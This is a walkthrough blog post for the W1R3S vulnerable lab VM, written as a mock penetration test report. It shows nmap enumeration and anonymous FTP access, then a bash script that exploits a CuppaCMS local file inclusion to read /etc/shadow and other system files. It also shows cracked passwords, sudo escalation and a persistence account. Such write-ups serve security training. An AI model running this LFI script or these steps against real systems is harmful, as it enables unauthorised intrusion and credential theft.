---
layout: post
title: "W1R3S Walkthrough"
date: 2018-12-02 10:49:43 +1100
categories: [writeup, vm, blog]
tags: [walkthrough, vulnhub]
points: 10000
asset: "/assets/walkthroughs/w1r3s/"
author: Morgaine Timms
license: CC-BY-4.0
thumbnail: 
thumbnailAttr: 
thumbnailAttrUrl: 
thumbnailAlt: 
published: true
toc: false
description: "A walkthrough for the W1R3S: 1.0.1 vulnerable VM by SpecterWires from Vulnhub"
excerpt_separator: <!--more-->
---

# Walkthrough and Writeup: W1R3S

This is a walkthough for the ["W1R3S: 1.01" vulnerable VM](https://www.vulnhub.com/entry/w1r3s-101,220/), created by [SpecterWires](https://www.vulnhub.com/author/specterwires,572/).
Needless to say, this page will be full of spoilers for the VM.

The format will be loosely based on the OSCP report format, but modified a little to make it more walkthrough friendly.

<!--more-->

The scenario introducing W1R3S is this:

> You have been hired to do a penetration test on the W1R3S.inc individual server and report all findings. They have asked you to gain root access and find the flag (located in /root directory).

## Information Gathering Phase

The scope of this assessment is an individual server owned and operated by W1R3S.inc.
The server is known to be the only machine on the network.
Using [netdiscover](http://manpages.ubuntu.com/manpages/bionic/man8/netdiscover.8.html) the server IP is identified as _172.16.2.24_ (an address in my lab).

![]({{ page.asset }}discovery.png)

## Service Enumeration

The tester enumerated the services running on the machine using [nmap](https://nmap.org/).


``` txt
Nmap scan report for 172.16.2.24
Host is up (0.00039s latency).
Not shown: 55528 filtered ports, 10003 closed ports
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 content
| drwxr-xr-x 2 ftp ftp 4096 Jan 23 2018 docs
|_drwxr-xr-x 2 ftp ftp 4096 Jan 28 2018 new-employees
| ftp-syst: 
| STAT: 
| FTP server status:
| Connected to ::ffff:172.16.2.2
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 1
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
| 256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_ 256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open mysql MySQL (unauthorized)
MAC Address: 08:00:27:1F:76:44 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT ADDRESS
1 0.39 ms 172.16.2.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 77.02 seconds
```


| IP          | port | service      |
| ----------- | ---- | ------------ |
| 172.16.2.24 | 21   | vsftpd       |
| 172.16.2.24 | 22   | openSSH      |
| 172.16.2.24 | 80   | Apache httpd |
| 172.16.2.24 | 3306 | MySQL        |


Per HTTP response headers, the target's OS is likely: Ubuntu Xenial 16.04 ([reference](https://packages.ubuntu.com/search?keywords=apache2))

![]({{ page.asset }}apachever.png)


### FTP service

<div class="bs-callout bs-callout-danger alert"><div><i class="fa fa-exclamation-triangle" aria-hidden="true"></i><p>
Vulnerability: The FTP service allows anonymous logon.
<br>
This constitutes a data breach.
If this were a real engagement it requires immediate disclosure to the client.
</p></div></div>

The nmap scan revealed 3 directories accessible to an anonymous user. All of these directories can be exfiltrated.

![]({{ page.asset }}openftp.png)

The files available via FTP contain sensitive company data, including employee names and roles.

``` txt
[10:44:55 root@kali][ ~/practise/ctf/w1r3s/loot/ftp-content/new-employees]
# cat employee-names.txt
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources
```

<div class="bs-callout bs-callout-success alert"><div><i class="fa fa-check" aria-hidden="true"></i><p>
Fix: disable anonymous login of the FTP service.
</p></div></div>

### Web Service

The web service is running a CMS called `CuppaCMS` with the default credentials `admin:admin`.

![]({{ page.asset }}cuppacmsdash.png)

<div class="bs-callout bs-callout-danger alert"><div><i class="fa fa-exclamation-triangle" aria-hidden="true"></i><p>
Vulnerability: This version of Cuppa CMS is vulnerable to a Local File Inclusion.
<br>
NOTE: I will be going into a bit more depth on this part and dropping the faux-formal tone, because it tripped me up at first.
</p></div></div>

If you want to skip how I found the LFI and go straight to the exploit, [click here](#exploiting-the-vulnerability)

According to `searchsploit` there is a possible LFI (local file inclusion) vulnerability in `/administrator/alerts/alertConfigField.php`.

![]({{ page.asset }}cuppavuln.png)

The [file from the exploit-DB](https://www.exploit-db.com/exploits/25971) does come with some exploit code, but it didn't work out of the box.

It's not super uncommon for exploit code to contain purposeful errors.
The vulnerable code uses `_REQUEST` which [according to the docs](http://php.net/manual/en/reserved.variables.request.php) is an associative array of `$_GET`, `$_POST`, and `$_COOKIE` variables. So I tried the LFI on all of them!

LFI on the GET parameter doesn't return anything:

![]({{ page.asset }}getlfi.png)

LFI using POST with URL parameters doesn't work either:

![]({{ page.asset }}postlfi.png)

Finally, an LFI using the POST body does work:

![]({{ page.asset }}postlfibody.png)

#### A deep dive into the code

I'm not happy not knowing why the POST body worked but the others didn't.
So I did some digging.

I downloaded a copy of CuppaCMS from here: [https://sourceforge.net/projects/cuppacms/](https://sourceforge.net/projects/cuppacms/)
I'm also hosting the file I got just in case: [locally hosted Cuppa zip]({{ page.asset }}cuppa_cms.zip)

I then used [ack](https://linux.die.net/man/1/ack) to search for the variable that was used to discover the LFI.

![]({{ page.asset }}varack.png)

That reveals this code:

``` php
<div id="content_alert_config" class="content_alert_config">
    <?php include "../components/table_manager/fields/config/".@$cuppa->POST("urlConfig"); ?>
</div>
```

Following the function call `$cuppa->POST` into Cuppa.php:

``` php
// post
public function POST($string){ 
    return $this->sanitizeString(@$_POST[$string]); 
}

[...snip...]

// santize String 
public function sanitizeString($string){ 
    return htmlspecialchars(trim(@$string)); 
}
```

CuppaCMS attempts to sanitise the input using [the built-in htmlspecialchars() function](http://php.net/manual/en/function.htmlspecialchars.php).
This converts the following characters:

| Character | Replacement |
| --------- | ----------- |
| &         | `&amp;`     |
| "         | `&quot;`    |
| '         | `&#039;`    |
| <         | `&lt;`      |
| >         | `&gt;`      |

This may have been an attempt to fix the vulnerability from ExploitDB, but
**LFI is still totally viable with this 'sanitisation'**.

<div class="bs-callout bs-callout-success alert"><div><i class="fa fa-check" aria-hidden="true"></i><p>
Fix: This vulnerability and a few others exist in the most recent version of CuppaCMS at time of reporting. The GitHub page suggests the dev team is slow at responding to security tickets.
<br>
Implementing a WAF in front of the application would effectively mitigate most of these vulnerabilities.
If possible, a CMS with better support options would further minimise risk.
</p></div></div>

Now I know what is happening, I am ready to exploit this vulnerability.

#### Exploiting the vulnerability

The tester discovered an LFI in CuppaCMS which allows extraction of system files.
A script was used in combination with [a post-exploitation list](https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List) to extract system data:

``` bash
#! /bin/bash

while read -r line; do
    encoded=`echo $line | sed "s=/=%2F=g"`
    fname=`echo $line | sed "s=/=_=g"`
    data='$(curl -d "urlConfig=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F$encoded" -X POST http://localhost/administrator/alerts/alertConfigField.php)'
    echo "$data" >> "$fname".txt
done <interestingFiles.txt
```

The tester was able to successfully exfiltrate the following assets:

* bin/nc
* etc/crontab
* etc/fstab
* etc/group
* etc/hosts
* etc/issue
* etc/ldap/ldap.conf
* etc/motd
* etc/network_interfaces
* etc/passwd
* etc/resolv.conf
* etc/shadow
* etc/sysctl.conf
* proc/cpuinfo
* proc/meminfo

<div class="bs-callout bs-callout-danger alert"><div><i class="fa fa-exclamation-triangle" aria-hidden="true"></i><p>
Vulnerability: The user running the web service is able to read /etc/shadow
<br>
On the target machine, /etc/shadow has global read/write '666' permissions.
</p></div></div>

The shadow file was exfiltrated and hashes for users `root`, `www-data`, and `w1r3s` were obtained.

![]({{ page.asset }}shadow.png)

The tester 'unshadowed' and cracked credentials for `www-data` and `w1r3s` using [John the Ripper](https://www.openwall.com/john/).

``` txt
www-data:www-data
w1r3s:computer
```

![]({{ page.asset }}cracking.png)

<div class="bs-callout bs-callout-success alert"><div><i class="fa fa-check" aria-hidden="true"></i><p>
Fix: Change the permissions of /etc/shadow to '600'.
</p></div></div>

### SSH Service

The tester gained access to the target server using the cracked credentials via SSH:

![]({{ page.asset }}ssh.png)

The user `w1r3s` has `sudo` rights. The tester used this access to elevate to the root user:

![]({{ page.asset }}sudol.png)

![]({{ page.asset }}sudosu.png)

The tester was also able to elevate to root privileges by overwriting the hash stored in `/etc/shadow` with a known hash.

The tester added a user account with sudo access to maintain access to the machine for futher testing.

## The End

The flag:

![]({{ page.asset }}flag.png)